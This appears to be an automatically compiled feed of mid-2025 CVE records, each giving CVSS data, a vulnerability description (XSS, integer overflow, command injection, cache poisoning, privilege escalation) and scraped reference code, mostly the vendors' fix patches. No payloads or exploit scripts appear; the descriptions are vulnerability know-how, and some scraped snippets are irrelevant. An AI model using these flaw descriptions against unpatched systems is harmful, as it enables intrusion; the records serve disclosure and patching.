 ui/cmdpipe.c | 13 ++++++++++---
 1 file changed, 10 insertions(+), 3 deletions(-)

diff --git a/ui/cmdpipe.c b/ui/cmdpipe.c
index 81acb9c8..bd5606a5 100644
--- a/ui/cmdpipe.c
+++ b/ui/cmdpipe.c
@@ -220,10 +220,17 @@ void execute_packet_child(
        the path to the mtr-packet executable.  This is necessary
        for debugging changes for mtr-packet.
      */
-    char *mtr_packet_path = getenv("MTR_PACKET");
-    if (mtr_packet_path == NULL) {
+    char * mtr_packet_path = NULL; 
+
+    // In the rare case that mtr-packet is not setuid-root, 
+    // and a select group of users has sudo privileges to run 
+    // mtr and not much else, THEN create /etc/mtr.is.run.under.sudo
+    // to prevent a privilege escalation when one of those accounts
+    // is compromised.  CVE-2025-49809
+    if (access ("/etc/mtr.is.run.under.sudo", F_OK) != 0)
+        mtr_packet_path = getenv("MTR_PACKET");
+    if (mtr_packet_path == NULL)
         mtr_packet_path = "mtr-packet";
-    }
 
     /*
        First, try to execute mtr-packet from PATH


================================================================================


CVE ID: CVE-2025-48172
Published: 2025-07-04T13:15:25.453
Modified: 2025-07-08T16:18:53.607
CVSS Score: 5.6 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L

CWE Categories:
  - CWE-190: Integer Overflow or Wraparound

Description:
CHMLib through 2bef8d0, as used in SumatraPDF and other products, has a chm_lib.c _chm_decompress_block integer overflow. There is a resultant heap-based buffer overflow in _chm_fetch_bytes.

References (5):
  1. https://drive.google.com/file/d/1XpulFyCGlq7Szzg5RsH-eRwZ6OyuSozl/view?usp=sharing
  2. https://drive.google.com/file/d/1wq51px42eoJz2VQ1Qu9ObPVQVom9T9H_/view?usp=sharing
  3. https://github.com/jedwing/CHMLib/blob/2bef8d063ec7d88a8de6fd9f0513ea42ac0fa21f/src/chm_lib.c#L1386
  4. https://github.com/sumatrapdfreader/sumatrapdf/commit/08179946a745cf1605e4b9670942ec1a6e1f4c5d
  5. https://drive.google.com/file/d/1XpulFyCGlq7Szzg5RsH-eRwZ6OyuSozl/view?usp=sharing

Attempting to extract code examples from references...

--- Code from https://github.com/sumatrapdfreader/sumatrapdf/commit/08179946a745cf1605e4b9670942ec1a6e1f4c5d ---
From 08179946a745cf1605e4b9670942ec1a6e1f4c5d Mon Sep 17 00:00:00 2001
From: Krzysztof Kowalczyk <kkowalczyk@gmail.com>
Date: Sat, 17 May 2025 17:59:25 +0200
Subject: [PATCH] fix crash caused by libchm (fixes #4937)

Thanks to Joseph Kiriacos for bug report and test file.
You can craft .chm file where block_len would pass > UINT_MAX test and
then we would crash in _chm_decompress_block because block_len + 6144
would overflow, cbuffer would be too small and memory would be
over-written in _chm_fetch_bytes
---
 ext/CHMLib/chm_lib.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/ext/CHMLib/chm_lib.c b/ext/CHMLib/chm_lib.c
index 0ae172a20fc2..fe07f344a8d8 100755
--- a/ext/CHMLib/chm_lib.c
+++ b/ext/CHMLib/chm_lib.c
@@ -411,9 +411,9 @@ static int _unmarshal_lzxc_reset_table(uint8_t** pData, unsigned int* pDataLen,
     if (dest->version != 2)
         return 0;
     /* SumatraPDF: sanity check (huge values are usually due to broken files) */
-    if (dest->uncompressed_len > UINT_MAX || dest->compressed_len > UINT_MAX)
+    if (dest->uncompressed_len > INT_MAX || dest->compressed_len > INT_MAX)
         return 0;
-    if (dest->block_len == 0 || dest->block_len > UINT_MAX)
+    if (dest->block_len == 0 || dest->block_len > INT_MAX)
         return 0;
 
     return 1;


================================================================================


CVE ID: CVE-2025-6740
Published: 2025-07-04T12:15:35.570
Modified: 2025-07-09T17:42:55.913
CVSS Score: 6.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Contact Form 7 Database Addon plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘tmpD’ parameter in all versions up to, and including, 1.3.1 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (4):
  1. https://plugins.trac.wordpress.org/browser/contact-form-cfdb7/tags/1.3.1/contact-form-cfdb-7.php [Product]
  2. https://plugins.trac.wordpress.org/changeset/3320134/ [Patch]
  3. https://wordpress.org/plugins/contact-form-cfdb7/#developers [Product, Release Notes]
  4. https://www.wordfence.com/threat-intel/vulnerabilities/id/014803c8-3319-48ad-98c7-d1f372d37ff2?source=cve [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/contact-form-cfdb7/#developers ---
add_filter('cfdb7_csv_delimiter', function( $delimiter ){<br />
    return ';';<br />
});

================================================================================


CVE ID: CVE-2025-7060
Published: 2025-07-04T11:15:51.683
Modified: 2025-10-01T13:31:16.640
CVSS Score: 4.1 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-20: Improper Input Validation
  - NVD-CWE-noinfo: NVD-CWE-noinfo

Description:
A vulnerability was found in Monitorr up to 1.7.6m. It has been classified as problematic. This affects an unknown part of the file assets/config/_installation/mkdbajax.php of the component Installer. The manipulation of the argument datadir leads to improper input validation. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (4):
  1. https://vuldb.com/?ctiid.314835 [Permissions Required, VDB Entry]
  2. https://vuldb.com/?id.314835 [Third Party Advisory, VDB Entry]
  3. https://vuldb.com/?submit.602080 [Exploit, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.602080 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314835 ---
datadir

================================================================================


CVE ID: CVE-2025-32918
Published: 2025-07-04T08:15:25.520
Modified: 2025-08-22T13:29:48.400
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-140: CWE-140

Description:
Improper neutralization of Livestatus command delimiters in autocomplete endpoint within the RestAPI of Checkmk versions <2.4.0p6, <2.3.0p35, <2.2.0p44, and 2.1.0 (EOL) allows an authenticated user to inject arbitrary Livestatus commands.

References (1):
  1. https://checkmk.com/werk/17987 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://checkmk.com/werk/17987 ---
livestatus

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N

CVE-2025-32918

================================================================================


CVE ID: CVE-2025-6944
Published: 2025-07-04T06:15:25.203
Modified: 2025-07-08T16:18:53.607
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The Uncode Core plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's 'uncode_hl_text' and 'uncode_text_icon' shortcodes in all versions up to, and including, 2.9.4.2 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (2):
  1. https://support.undsgn.com/hc/en-us/articles/213454129-Change-Log
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/52935b60-3ec5-45e6-9d12-200bf107c9df?source=cve

Attempting to extract code examples from references...

--- Code from https://support.undsgn.com/hc/en-us/articles/213454129-Change-Log ---
ADD: 
  - WooCommerce 10.2.0 compatibility 
  - Safari back-forward cache event 
  - Captions in Lightbox for Carousels inside the Post Module Grid
  - Added SKU element in the Posts Module

ADD:

- WooCommerce 10.1.0 compatibility
- 'uncode_search_placeholder_text' Filter

FIX:

- Cross Site Scripting (XSS) vulnerability
- Alignment of columns with custom width
- Empty items on galleries
- Sticky Scroll on Safari and Firefox
- Avoid redundant recalculations with Sticky Scroll
- Fix Classic Rental and Creative Real Estate demo import
- Custom font size preview in Frotend Editor
- Page Builder UI icons

IMPROVEMENTS:

- Playsinline attribute by default for self-hosted videos on mobile
- Products accessibility
- Row animation scroll length option
- Category class on filterable elements

UPDATES:

- Uncode Core 2.9.4.4
- Revolution Slider 6.7.36

IMPROVEMENTS:

- WCAG/ADA Accessibility improvements

FIX:

- Vulnerability Fix XSS Authenticated (Contributor+) via Shortcodes<br>- Lenis adjustments

UPDATES:

- Uncode Core 2.9.4.3

================================================================================


CVE ID: CVE-2025-7053
Published: 2025-07-04T03:15:23.917
Modified: 2025-10-01T13:56:03.400
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability was found in Cockpit up to 2.11.3. It has been rated as problematic. This issue affects some unknown processing of the file /system/users/save. The manipulation of the argument name/email leads to cross site scripting. The attack may be initiated remotely. Upgrading to version 2.11.4 is able to address this issue. The patch is named bdcd5e3bc651c0839c7eea807f3eb6af856dbc76. It is recommended to upgrade the affected component. The vendor was contacted early about this disclosure and acted very professional. A patch and new release was made available very quickly.

References (6):
  1. https://github.com/Cockpit-HQ/Cockpit/commit/bdcd5e3bc651c0839c7eea807f3eb6af856dbc76 [Patch]
  2. https://github.com/Cockpit-HQ/Cockpit/releases/tag/2.11.4 [Release Notes]
  3. https://vuldb.com/?ctiid.314819 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314819 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605594 [Exploit, Third Party Advisory, VDB Entry]
  6. https://vuldb.com/?submit.605594 [Exploit, Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/Cockpit-HQ/Cockpit/commit/bdcd5e3bc651c0839c7eea807f3eb6af856dbc76 ---
From bdcd5e3bc651c0839c7eea807f3eb6af856dbc76 Mon Sep 17 00:00:00 2001
From: Artur Heinze <artur@agentejo.com>
Date: Fri, 27 Jun 2025 14:51:30 +0200
Subject: [PATCH] Escape user-provided data to prevent XSS vulnerabilities in
 views.

---
 modules/App/layouts/app.php           | 10 +++++-----
 modules/App/views/dashboard/index.php |  8 ++++----
 modules/App/views/lockedResouce.php   |  4 ++--
 3 files changed, 11 insertions(+), 11 deletions(-)

diff --git a/modules/App/layouts/app.php b/modules/App/layouts/app.php
index 952922244..21539184a 100644
--- a/modules/App/layouts/app.php
+++ b/modules/App/layouts/app.php
@@ -139,7 +139,7 @@ class="<?= $this->helper('theme')->pageClass() ?>"
                     <div class="kiss-flex-1 kiss-margin-left"></div>
                     <?php $this->block('app.layout.header') ?>
                     <a class="kiss-margin-left" href="#app-account-menu" aria-label="<?=t('Account')?>" kiss-popout>
-                        <app-avatar size="30" name="<?= $this['user/name'] ?>"></app-avatar>
+                        <app-avatar size="30" name="<?= $this->escape($this['user/name']) ?>"></app-avatar>
                     </a>
                 </kiss-container>
             </app-header>
@@ -154,10 +154,10 @@ class="<?= $this->helper('theme')->pageClass() ?>"
             <kiss-card class="kiss-padding kiss-margin-small" theme="contrast">
 
                 <kiss-row gap="small">
-                    <div><app-avatar size="35" name="<?= $this['user/name'] ?>"></app-avatar></div>
+                    <div><app-avatar size="35" name="<?=$this->escape($this['user/name'])?>"></app-avatar></div>
                     <div class="kisss-flex-1">
-                        <div class="kiss-text-bold kiss-text-truncate kiss-size-small"><?= $this['user/name'] ?></div>
-                        <div class="kiss-color-muted kiss-text-truncate kiss-size-xsmall"><?= $this['user/email'] ?></div>
+                        <div class="kiss-text-bold kiss-text-truncate kiss-size-small"><?= $this->escape($this['user/name']) ?></div>
+                        <div class="kiss-color-muted kiss-text-truncate kiss-size-xsmall"><?=$this->escape($this['user/email'])?></div>
                     </div>
                 </kiss-row>
 
@@ -181,7 +181,7 @@ class="<?= $this->helper('theme')->pageClass() ?>"
     <kiss-offcanvas id="app-offcanvas">
         <kiss-content class="kiss-flex kiss-flex-column">
             <div class="kiss-padding kiss-flex kiss-bgcolor-contrast kiss-flex kiss-flex-middle">
-                <div><app-avatar size="30" name="<?= $this['user/name'] ?>"></app-avatar></div>
+                <div><app-avatar size="30" name="<?=$this->escape($this['user/name'])?>"></app-avatar></div>
                 <div class="kiss-margin-small-left kiss-flex-1 kiss-size-xsmall">
                     <div class="kiss-text-bold kiss-text-truncate"><?= $this->escape($this['user/name']) ?></div>
                     <div class="kiss-color-muted kiss-text-truncate"><?= $this->escape($this['user/email']) ?></div>
diff --git a/modules/App/views/dashboard/index.php b/modules/App/views/dashboard/index.php
index 44d21ebbd..d757d8096 100644
--- a/modules/App/views/dashboard/index.php
+++ b/modules/App/views/dashboard/index.php
@@ -22,11 +22,11 @@
 
                 <div class="kiss-flex-inline kiss-flex-middle" gap="small">
                     <div>
-                        <app-avatar size="40" name="<?=$this['user/name']?>"></app-avatar>
+                        <app-avatar size="40" name="<?=$this->escape($this['user/name'])?>"></app-avatar>
                     </div>
                     <div>
-                        <div class="kiss-text-bold"><?=$this['user/name']?></div>
-                        <div class="kiss-text-truncate kiss-color-muted kiss-size-small"><?=$this['user/email']?></div>
+                        <div class="kiss-text-bold"><?=$this->escape($this['user/name'])?></div>
+                        <div class="kiss-text-truncate kiss-color-muted kiss-size-small"><?=$this->escape($this['user/email'])?></div>
                     </div>
                 </div>
 
@@ -41,7 +41,7 @@
 
                 <kiss-card class="kiss-padding-large kiss-flex kiss-flex-middle kiss-flex-center kiss-align-center kiss-visible@m" :class="widgets.length  ? 'kiss-height-30vh' : 'kiss-height-50vh'" :theme="widgets.length ? 'contrast shadowed':''">
                     <div class="animated fadeInUp">
-                        <div class="kiss-size-xlarge kiss-margin-small"><?=_t('Hello %s', [$this['user/name']])?></div>
+                        <div class="kiss-size-xlarge kiss-margin-small"><?=_t('Hello %s', [$this->escape($this['user/name'])])?></div>
                         <div class="kiss-color-muted kiss-size-1 kiss-text-light animated fadeIn delay-1s"><?=t("Excited for your creations today!")?></div>
                     </div>
                 </kiss-card>
diff --git a/modules/App/views/lockedResouce.php b/modules/App/views/lockedResouce.php
index 9ba888f38..c3bcb2c96 100644
--- a/modules/App/views/lockedResouce.php
+++ b/modules/App/views/lockedResouce.php
@@ -12,7 +12,7 @@
 
             <div class="kiss-flex kiss-flex-middle">
                 <div class="kiss-margin-small-right">
-                    <app-avatar size="40" name="<?=$meta['user']['name']?>">
+                    <app-avatar size="40" name="<?=$this->escape($meta['user']['name'])?>">
                         <canvas width="40" height="40"></canvas>
                     </app-avatar>
                 </div>
@@ -43,4 +43,4 @@
 
     </kiss-card>
 
-</kiss-container>
\ No newline at end of file
+</kiss-container>


================================================================================


CVE ID: CVE-2025-6786
Published: 2025-07-04T03:15:23.237
Modified: 2025-07-08T16:18:53.607
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-284: CWE-284

Description:
The DocCheck Login plugin for WordPress is vulnerable to unauthorized post access in all versions up to, and including, 1.1.5. This is due to plugin redirecting a user to login on a password protected post after the page has loaded. This makes it possible for unauthenticated attackers to read posts they should not have access to.

References (2):
  1. https://wordpress.org/plugins/doccheck-login/
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/0739b5ec-b1c4-4451-97c1-f8d5ed26a2d5?source=cve

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/doccheck-login/ ---
doccheck-login

/wp-content/plugins/

================================================================================


CVE ID: CVE-2025-49826
Published: 2025-07-03T21:15:27.287
Modified: 2025-09-10T15:28:32.130
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-444: CWE-444

Description:
Next.js is a React framework for building full-stack web applications. From versions 15.0.4-canary.51 to before 15.1.8, a cache poisoning bug leading to a Denial of Service (DoS) condition was found in Next.js. This issue does not impact customers hosted on Vercel. Under certain conditions, this issue may allow a HTTP 204 response to be cached for static pages, leading to the 204 response being served to all users attempting to access the page. This issue has been addressed in version 15.1.8.

References (4):
  1. https://github.com/vercel/next.js/commit/a15b974ed707d63ad4da5b74c1441f5b7b120e93 [Patch]
  2. https://github.com/vercel/next.js/releases/tag/v15.1.8 [Release Notes]
  3. https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r [Vendor Advisory]
  4. https://vercel.com/changelog/cve-2025-49826 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/vercel/next.js/commit/a15b974ed707d63ad4da5b74c1441f5b7b120e93 ---
From a15b974ed707d63ad4da5b74c1441f5b7b120e93 Mon Sep 17 00:00:00 2001
From: Zack Tanner <1939140+ztanner@users.noreply.github.com>
Date: Thu, 22 May 2025 13:17:25 -0700
Subject: [PATCH] [backport]: properly gate segmentCache branch in base-server
 (#79505)

In 15.1, this branch should be a no-op when PPR is not enabled, because
`collectSegmentData` is
[gated](https://github.com/vercel/next.js/blob/69afa37323610c9bbfbecd22f0194f2f299d5a6c/packages/next/src/server/app-render/app-render.tsx#L4008)
on `isRoutePPREnabled`.

This also sets a no-store cache header when we respond with a 204 to
align with intended behavior.
---
 packages/next/src/server/base-server.ts       | 23 +++++++++++--------
 .../segment-cache-incremental-opt-in.test.ts  |  3 ++-
 .../pages-performance-mark/pages/_document.js |  1 -
 3 files changed, 15 insertions(+), 12 deletions(-)

diff --git a/packages/next/src/server/base-server.ts b/packages/next/src/server/base-server.ts
index 367116abf0d87..14e129c3ff6e7 100644
--- a/packages/next/src/server/base-server.ts
+++ b/packages/next/src/server/base-server.ts
@@ -3054,7 +3054,11 @@ export default abstract class Server<
       }
     )
 
-    if (isPrefetchRSCRequest && typeof segmentPrefetchHeader === 'string') {
+    if (
+      isRoutePPREnabled &&
+      isPrefetchRSCRequest &&
+      typeof segmentPrefetchHeader === 'string'
+    ) {
       // This is a prefetch request issued by the client Segment Cache. These
       // should never reach the application layer (lambda). We should either
       // respond from the cache (HIT) or respond with 204 No Content (MISS).
@@ -3090,15 +3094,14 @@ export default abstract class Server<
       // segment), we should *always* respond with a tree, even if PPR
       // is disabled.
       res.statusCode = 204
-      if (isRoutePPREnabled) {
-        // Set a header to indicate that PPR is enabled for this route. This
-        // lets the client distinguish between a regular cache miss and a cache
-        // miss due to PPR being disabled.
-        // NOTE: Theoretically, when PPR is enabled, there should *never* be
-        // a cache miss because we should generate a fallback route. So this
-        // is mostly defensive.
-        res.setHeader(NEXT_DID_POSTPONE_HEADER, '1')
-      }
+
+      // Set a header to indicate that PPR is enabled for this route. This
+      // lets the client distinguish between a regular cache miss and a cache
+      // miss due to PPR being disabled.
+      // NOTE: Theoretically, when PPR is enabled, there should *never* be
+      // a cache miss because we should generate a fallback route. So this
+      // is mostly defensive.
+      res.setHeader(NEXT_DID_POSTPONE_HEADER, '1')
       return {
         type: 'rsc',
         body: RenderResult.fromStatic(''),
diff --git a/test/e2e/app-dir/segment-cache/incremental-opt-in/segment-cache-incremental-opt-in.test.ts b/test/e2e/app-dir/segment-cache/incremental-opt-in/segment-cache-incremental-opt-in.test.ts
index 38509a6e6274f..c99c0e8eedebc 100644
--- a/test/e2e/app-dir/segment-cache/incremental-opt-in/segment-cache-incremental-opt-in.test.ts
+++ b/test/e2e/app-dir/segment-cache/incremental-opt-in/segment-cache-incremental-opt-in.test.ts
@@ -1,6 +1,7 @@
 import { nextTestSetup } from 'e2e-utils'
 
-describe('segment cache (incremental opt in)', () => {
+// Backport Note: This test is skipped as it's only currently usable in the experimental release channel.
+describe.skip('segment cache (incremental opt in)', () => {
   const { next, isNextDev, skipped } = nextTestSetup({
     files: __dirname,
     skipDeployment: true,
diff --git a/test/e2e/pages-performance-mark/pages/_document.js b/test/e2e/pages-performance-mark/pages/_document.js
index 631f77daf39a1..bff2b1b2821cb 100644
--- a/test/e2e/pages-performance-mark/pages/_document.js
+++ b/test/e2e/pages-performance-mark/pages/_document.js
@@ -3,7 +3,6 @@ import { Html, Head, Main, NextScript } from 'next/document'
 export default function Document() {
   return (
     <Html>
-      <Head />
       <Head />
       <body>
         <Main />


================================================================================


CVE ID: CVE-2025-49005
Published: 2025-07-03T21:15:26.787
Modified: 2025-09-10T19:14:45.153
CVSS Score: 3.7 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-444: CWE-444

Description:
Next.js is a React framework for building full-stack web applications. In Next.js App Router from 15.3.0 to before 15.3.3 and Vercel CLI from 41.4.1 to 42.2.0, a cache poisoning vulnerability was found. The issue allowed page requests for HTML content to return a React Server Component (RSC) payload instead under certain conditions. When deployed to Vercel, this would only impact the browser cache, and would not lead to the CDN being poisoned. When self-hosted and deployed externally, this could lead to cache poisoning if the CDN does not properly distinguish between RSC / HTML in the cache keys. This issue has been resolved in Next.js 15.3.3.

References (6):
  1. https://github.com/vercel/next.js/commit/ec202eccf05820b60c6126d6411fe16766ecc066 [Patch]
  2. https://github.com/vercel/next.js/issues/79346 [Exploit, Issue Tracking]
  3. https://github.com/vercel/next.js/releases/tag/v15.3.3 [Release Notes]
  4. https://github.com/vercel/next.js/security/advisories/GHSA-r2fc-ccr8-96c4 [Vendor Advisory]
  5. https://vercel.com/changelog/cve-2025-49005 [Vendor Advisory]
  6. https://github.com/vercel/next.js/issues/79346 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/vercel/next.js/commit/ec202eccf05820b60c6126d6411fe16766ecc066 ---
From ec202eccf05820b60c6126d6411fe16766ecc066 Mon Sep 17 00:00:00 2001
From: Jude Gao <jude.gao@vercel.com>
Date: Fri, 23 May 2025 16:44:39 -0400
Subject: [PATCH] Revert "[next-server] skip setting vary header for basic
 routes" (#79426)

Reverts vercel/next.js#77797
Reinstate the `Vary` header to prevent browsers from incorrectly reusing
RSC responses during bfcache restores.
---
 packages/next/src/server/base-server.ts | 12 +++++++++---
 test/e2e/app-dir/app/index.test.ts      | 23 +++++++++++++++++++++++
 test/e2e/vary-header/test/index.test.ts | 14 ++++++++++++--
 3 files changed, 44 insertions(+), 5 deletions(-)

diff --git a/packages/next/src/server/base-server.ts b/packages/next/src/server/base-server.ts
index 80e10f84f1ccf..3cfd47c753c63 100644
--- a/packages/next/src/server/base-server.ts
+++ b/packages/next/src/server/base-server.ts
@@ -104,6 +104,7 @@ import {
   NEXT_ROUTER_SEGMENT_PREFETCH_HEADER,
   NEXT_DID_POSTPONE_HEADER,
   NEXT_URL,
+  NEXT_ROUTER_STATE_TREE_HEADER,
   NEXT_IS_PRERENDER_HEADER,
 } from '../client/components/app-router-headers'
 import type {
@@ -1981,16 +1982,21 @@ export default abstract class Server<
     isAppPath: boolean,
     resolvedPathname: string
   ): void {
+    const baseVaryHeader = `${RSC_HEADER}, ${NEXT_ROUTER_STATE_TREE_HEADER}, ${NEXT_ROUTER_PREFETCH_HEADER}, ${NEXT_ROUTER_SEGMENT_PREFETCH_HEADER}`
+    const isRSCRequest = getRequestMeta(req, 'isRSCRequest') ?? false
+
     let addedNextUrlToVary = false
 
     if (isAppPath && this.pathCouldBeIntercepted(resolvedPathname)) {
       // Interception route responses can vary based on the `Next-URL` header.
       // We use the Vary header to signal this behavior to the client to properly cache the response.
-      res.appendHeader('vary', `${NEXT_URL}`)
+      res.appendHeader('vary', `${baseVaryHeader}, ${NEXT_URL}`)
       addedNextUrlToVary = true
+    } else if (isAppPath || isRSCRequest) {
+      // We don't need to include `Next-URL` in the Vary header for non-interception routes since it won't affect the response.
+      // We also set this header for pages to avoid caching issues when navigating between pages and app.
+      res.appendHeader('vary', baseVaryHeader)
     }
-    // For other cases such as App Router requests or RSC requests we don't need to set vary header since we already
-    // have the _rsc query with the unique hash value.
 
     if (!addedNextUrlToVary) {
       // Remove `Next-URL` from the request headers we determined it wasn't necessary to include in the Vary header.
diff --git a/test/e2e/app-dir/app/index.test.ts b/test/e2e/app-dir/app/index.test.ts
index 69f659f97fec6..f42ed3e642307 100644
--- a/test/e2e/app-dir/app/index.test.ts
+++ b/test/e2e/app-dir/app/index.test.ts
@@ -323,6 +323,29 @@ describe('app dir - basic', () => {
     expect(res.headers.get('Content-Type')).toBe('text/x-component')
   })
 
+  it('should return the `vary` header from edge runtime', async () => {
+    const res = await next.fetch('/dashboard')
+    expect(res.headers.get('x-edge-runtime')).toBe('1')
+    expect(res.headers.get('vary')).toBe(
+      'RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch'
+    )
+  })
+
+  if (!isNextDeploy) {
+    it('should return the `vary` header from pages for flight requests', async () => {
+      const res = await next.fetch('/', {
+        headers: {
+          ['RSC'.toString()]: '1',
+        },
+      })
+      expect(res.headers.get('vary')).toBe(
+        isNextDeploy
+          ? 'RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch'
+          : 'RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding'
+      )
+    })
+  }
+
   it('should pass props from getServerSideProps in root layout', async () => {
     const $ = await next.render$('/dashboard')
     expect($('title').first().text()).toBe('hello world')
diff --git a/test/e2e/vary-header/test/index.test.ts b/test/e2e/vary-header/test/index.test.ts
index 1fcf82bd0f38c..5919cd711b560 100644
--- a/test/e2e/vary-header/test/index.test.ts
+++ b/test/e2e/vary-header/test/index.test.ts
@@ -12,16 +12,21 @@ describe('Vary Header Tests', () => {
     expect(res.headers.get('vary')).toContain('Custom-Header')
   })
 
-  it('should preserve custom vary header', async () => {
+  it('should preserve custom vary header and append RSC headers in app route handlers', async () => {
     const res = await next.fetch('/normal')
     const varyHeader = res.headers.get('vary')
 
     // Custom header is preserved
     expect(varyHeader).toContain('User-Agent')
     expect(res.headers.get('cache-control')).toBe('s-maxage=3600')
+
+    // Next.js internal headers are appended
+    expect(varyHeader).toContain('RSC')
+    expect(varyHeader).toContain('Next-Router-State-Tree')
+    expect(varyHeader).toContain('Next-Router-Prefetch')
   })
 
-  it('should preserve middleware vary header', async () => {
+  it('should preserve middleware vary header in combination with route handlers', async () => {
     const res = await next.fetch('/normal')
     const varyHeader = res.headers.get('vary')
     const customHeader = res.headers.get('my-custom-header')
@@ -32,5 +37,10 @@ describe('Vary Header Tests', () => {
     // Both middleware and route handler vary headers are preserved
     expect(varyHeader).toContain('my-custom-header')
     expect(varyHeader).toContain('User-Agent')
+
+    // Next.js internal headers are still present
+    expect(varyHeader).toContain('RSC')
+    expect(varyHeader).toContain('Next-Router-State-Tree')
+    expect(varyHeader).toContain('Next-Router-Prefetch')
   })
 })


================================================================================


CVE ID: CVE-2025-53370
Published: 2025-07-03T20:15:23.893
Modified: 2025-08-22T14:19:32.820
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
Citizen is a MediaWiki skin that makes extensions part of the cohesive experience. From versions 1.9.4 to before 3.4.0, short descriptions set via the ShortDescription extension are inserted as raw HTML by the Citizen skin, allowing any user to insert arbitrary HTML into the DOM by editing a page. This issue has been patched in version 3.4.0.

References (3):
  1. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/commit/c85a40bddc8651fff66df83a72debddcb34f0521 [Patch]
  2. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/releases/tag/v3.4.0 [Release Notes]
  3. https://github.com/StarCitizenTools/mediawiki-skins-Citizen/security/advisories/GHSA-prmv-7r8c-794g [Exploit, Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/StarCitizenTools/mediawiki-skins-Citizen/commit/c85a40bddc8651fff66df83a72debddcb34f0521 ---
From c85a40bddc8651fff66df83a72debddcb34f0521 Mon Sep 17 00:00:00 2001
From: SomeRandomDeveloper <thisisnotmyname275@gmail.com>
Date: Thu, 3 Jul 2025 12:55:45 -0400
Subject: [PATCH] =?UTF-8?q?fix(SECURITY):=20=F0=9F=90=9B=20=F0=9F=94=92?=
 =?UTF-8?q?=EF=B8=8F=20sanitize=20short=20description=20page=20tagline?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

The short descriptions from Wikibase and ShortDescription
can contain unsanitized user input. This fixes a stored XSS vulnerability.

CVE-2025-53370
---
 includes/Components/CitizenComponentPageHeading.php | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/includes/Components/CitizenComponentPageHeading.php b/includes/Components/CitizenComponentPageHeading.php
index 4fbe56a80..7d71fc26e 100644
--- a/includes/Components/CitizenComponentPageHeading.php
+++ b/includes/Components/CitizenComponentPageHeading.php
@@ -248,7 +248,7 @@ private function getTagline(): string {
 		// from Extension:ShortDescription
 		$shortdesc = $this->out->getProperty( 'shortdesc' );
 		if ( $shortdesc ) {
-			$tagline = $shortdesc;
+			$tagline = htmlspecialchars( $shortdesc, ENT_QUOTES );
 		} else {
 			$tagline = $this->determineTagline();
 		}


================================================================================


CVE ID: CVE-2025-53369
